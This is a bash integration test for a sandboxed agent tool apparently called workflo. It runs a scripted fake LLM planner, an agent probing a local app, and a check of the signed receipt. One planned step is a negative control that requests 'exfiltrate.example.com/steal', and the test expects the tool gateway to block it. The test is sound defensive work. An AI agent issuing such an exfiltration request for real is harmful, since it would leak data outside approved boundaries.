#!/bin/bash
# The Autonomous Verified Deep Test — the milestone golden run via the
# real CLI:
#
#   fake LLM server (scripted planner) + `workflo config set-llm`
#     -> workflo run --path fixture --deep-test --start-command ...
#     -> CLI enables LLM planner mode
#     -> app boots in its own sandbox
#     -> the LLM plans; the sandboxed agent executes via governed tools
#     -> exfiltration attempt denied + recorded
#     -> teardown verified -> receipt v3 signed -> workflo verify
set -euo pipefail
REPO_ROOT="${WORKFLO_REPO_ROOT:-$(cd "$(dirname "${0}")/../.." && pwd)}"
export PATH="/opt/workflo/venv/bin:$PATH"

if [ "$(id -u)" -ne 0 ]; then echo "must run as root" >&2; exit 1; fi

WORK="${WORKFLO_PLANNER_GOLDEN_DIR:-/root/wf-planner-golden}"
rm -rf "$WORK"; mkdir -p "$WORK"; cd "$WORK"

# --- Fake OpenAI-compatible LLM server (scripted planner) ---
cat > fake_llm.py <<'EOF'
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(sys.argv[1])
plans = [
    {"done": False, "steps": [
        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/"},
         "reason": "check a healthy root control route"},
        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/health"},
         "reason": "check a healthy health control route"},
        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
         "reason": "probe checkout and record the first server error"},
        {"tool": "http_get", "args": {"url": "http://app.workflo.internal:3457/checkout"},
         "reason": "repeat checkout to prove the failure is reproducible"},
        {"tool": "http_get", "args": {"url": "http://exfiltrate.example.com/steal"},
         "reason": "negative control: this request must be denied by the ToolGateway"},
    ]},
    {"done": True, "steps": []},
]

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/models":
            body = json.dumps({"data": [{"id": "scripted-planner"}]}).encode()
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        plan = plans.pop(0) if plans else {"done": True, "steps": []}
        body = json.dumps({"choices": [{"message": {
            "role": "assistant",
            "content": "```json\n" + json.dumps(plan) + "\n```",
        }}]}).encode()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass

HTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
EOF

# Keep this test's credentials/configuration isolated from the host user's config.
export WORKFLO_CONFIG_DIR="$WORK/config"
mkdir -p "$WORKFLO_CONFIG_DIR"

/opt/workflo/venv/bin/python fake_llm.py 9998 &
LLM_PID=$!
# Ensure the server process cannot leak on an early test failure.
trap 'kill "$LLM_PID" 2>/dev/null || true' EXIT

# Wait for the fake OpenAI-compatible server to be ready; do not rely on a
# fixed sleep or silently fall back to an unconfigured planner.
READY=0
for _ in $(seq 1 50); do
  if /opt/workflo/venv/bin/python -c \
    'import urllib.request; urllib.request.urlopen("http://127.0.0.1:9998/models", timeout=0.5).close()' \
    >/dev/null 2>&1; then
    READY=1
    break
  fi
  sleep 0.2
done
if [ "$READY" -ne 1 ]; then
  echo "PLANNER GOLDEN FAILED: fake model server did not become ready" >&2
  exit 1
fi

# --- Configure and verify the CLI's LLM endpoint. Configuration failure is fatal. ---
workflo config set-llm \
  --base-url "http://127.0.0.1:9998" \
  --api-key "golden-test-key" \
  --model "scripted-planner" \
  >/dev/null
workflo config test-llm

echo "==> workflo run --deep-test (LLM planner mode)"
set +e
workflo run --path "${WORKFLO_PLANNER_FIXTURE:-/root/wf-fixture}" --deep-test --start-command "python3 app.py" --port 3457 --timeout 300 \
  >run.stdout 2>run.stderr
RUN_EXIT=$?
set -e
grep -E 'Agent planner|Tests:|Agent \(|Canary|removed|terminated|gone|Signed receipt|Duration' run.stderr || true

kill $LLM_PID 2>/dev/null || true

RECEIPT=$(find .workflo/runs -name receipt.json -type f | head -1)
if [ -z "$RECEIPT" ]; then
  echo "PLANNER GOLDEN FAILED: no receipt" >&2
  head -12 run.stderr >&2
  exit 1
fi

# This scripted mission intentionally finds a reproducible product defect.
# The Judge must confirm two identical checkout 500s against healthy controls;
# a blocked exfiltration attempt remains a separate policy-denial observation.
python3 - "$RECEIPT" <<'PY'
import json
import sys

document = json.load(open(sys.argv[1], encoding="utf-8"))
receipt = document.get("receipt", document)
findings = receipt.get("run_report", {}).get("findings", [])
activity = receipt.get("agent_activity") or {}
print("Agent activity:", json.dumps({
    "planner": activity.get("planner"),
    "tool_calls": activity.get("tool_calls"),
    "tools_used": activity.get("tools_used"),
    "steps_total": activity.get("steps_total"),
    "steps_completed": activity.get("steps_completed"),
    "steps_failed": activity.get("steps_failed"),
    "denied_attempts": activity.get("denied_attempts"),
}, sort_keys=True))
evidence_dir = __import__("pathlib").Path(sys.argv[1]).parent / "evidence"
record_files = list(evidence_dir.rglob("agent_tool_calls.jsonl")) if evidence_dir.exists() else []
for record_file in record_files:
    records = [json.loads(line) for line in record_file.read_text(encoding="utf-8").splitlines() if line.strip()]
    print("Agent tool record summary:", json.dumps([
        {
            "tool": record.get("tool"),
            "denied": record.get("denied"),
            "ok": record.get("ok"),
            "status": (record.get("result_summary") or {}).get("status"),
            "error": (record.get("result_summary") or {}).get("error"),
            "url": (record.get("args") or {}).get("url"),
        }
        for record in records
    ], sort_keys=True))
confirmed = [
    finding for finding in findings
    if finding.get("status") == "confirmed"
    and finding.get("title") == "GET /checkout fails (HTTP 500)"
]
if activity.get("planner") != "llm":
    print("Expected the LLM planner in the signed receipt; got:", activity, file=sys.stderr)
    raise SystemExit(1)
if int(activity.get("tool_calls", 0)) < 5:
    print("Expected at least five governed tool calls; got:", activity, file=sys.stderr)
    raise SystemExit(1)
if not confirmed:
    print("Expected a confirmed GET /checkout HTTP 500 finding; got:", findings, file=sys.stderr)
    raise SystemExit(1)
print("Confirmed reproducible QA finding:", confirmed[0]["title"])
print("Evidence references:", ", ".join(confirmed[0].get("evidence_refs", [])))
PY

echo
echo "==> workflo verify (independent)"
set +e
bash "$REPO_ROOT/scripts/linux/package_receipt_key.sh" "$RECEIPT"
PUBKEY="$(dirname "$RECEIPT")/receipt-key.pub.pem"
EVIDENCE="$(dirname "$RECEIPT")/evidence"

workflo verify --receipt "$RECEIPT" --pubkey "$PUBKEY" --evidence "$EVIDENCE" >verify.stdout 2>verify.stderr
VERIFY_EXIT=$?
set -e
cat verify.stderr

echo
echo "    run exit:    $RUN_EXIT (1 = expected verified finding)"
echo "    verify exit: $VERIFY_EXIT"
[ "$RUN_EXIT" -eq 1 ] || { echo "PLANNER GOLDEN FAILED (expected exit code 1 for the confirmed finding)"; exit 1; }
[ "$VERIFY_EXIT" -ne 0 ] && { echo "PLANNER GOLDEN FAILED (verify)"; exit 1; }
echo "PLANNER GOLDEN PASSED: planner -> governed agent -> confirmed QA finding -> signed receipt -> verified"
